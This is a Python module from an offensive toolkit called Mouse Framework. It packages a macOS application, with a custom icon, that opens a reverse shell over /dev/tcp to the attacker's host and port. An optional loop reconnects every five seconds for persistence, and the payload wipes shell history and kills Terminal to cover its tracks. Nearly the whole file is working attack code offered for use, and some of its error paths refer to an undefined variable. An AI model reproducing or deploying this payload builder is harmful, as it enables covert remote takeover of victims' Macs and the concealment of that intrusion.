#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.helper as h
import os, time

class payload:
	def __init__(self):
		self.name = "App macOS payload"
		self.description = "Convert payload into the macOS Application."
		self.usage = "Run this application."

	def run(self,server):
		while 1:
			shell = input(h.info_general_raw("Target shell: ")).strip(" ")
			if shell == "":
				shell = "sh"
			icon = input(h.info_general_raw("Application icon: ")).strip(" ")
			if os.path.exists(icon):
				if os.path.isdir(icon):
					h.info_error("Error: "+run+": is a directory!")
					input("Press enter to continue...").strip(" ")
					os.system("touch .nopayload")
					return
			else:
				h.info_error("Local file: "+run+": does not exist!")
				input("Press enter to continue...").strip(" ")
				os.system("touch .nopayload")
				return
			persistence = input(h.info_question_raw("Make persistent? (y/n): ")).strip(" ").lower()
			if persistence == "y":
				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
				break
			else:
				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
				break
		shell_command += "history -wc;killall Terminal"
		path = input(h.info_general_raw("Output path: ")).strip(" ")
		if path == "":
			path = "payload.app"
		if os.path.isdir(path):
			if os.path.exists(path):
				if path[-1] == "/":
					payload_save_path = path + "payload.app"
				else:
					payload_save_path = path + "/payload.app"
			else:
				h.info_error("Local directory: "+path+": does not exist!")
				input("Press enter to continue...").strip(" ")
				os.system("touch .nopayload")
				return
		else:
			direct = os.path.split(path)[0]
			if direct == "":
				direct = "."
			else:
				pass
			if os.path.exists(direct):
				if os.path.isdir(direct):
					payload_save_path = path
				else:
					h.info_error("Error: "+direct+": not a directory!")
					input("Press enter to continue...").strip(" ")
					os.system("touch .nopayload")
					return
			else:
				h.info_error("Local directory: "+direct+": does not exist!")
				input("Press enter to continue...").strip(" ")
				os.system("touch .nopayload")
				return
		h.info_general("Creating payload...")
		os.system("cp -r data/app/payload.app "+path+" > /dev/null")
		if icon != "":
			os.system("mv "+icon+" "+path+"/Contents/Resources/payload.icns > /dev/null")
		payload = """\
#! /usr/bin/env bash
"""+shell_command
		h.info_general("Saving to " + path + "...")
		f = open(payload_save_path,"w")
		f.write(payload)
		f.close()
		h.info_success("Saved to " + path + "!")
		os.system("chmod +x "+path+"/Contents/MacOS/payload.sh")
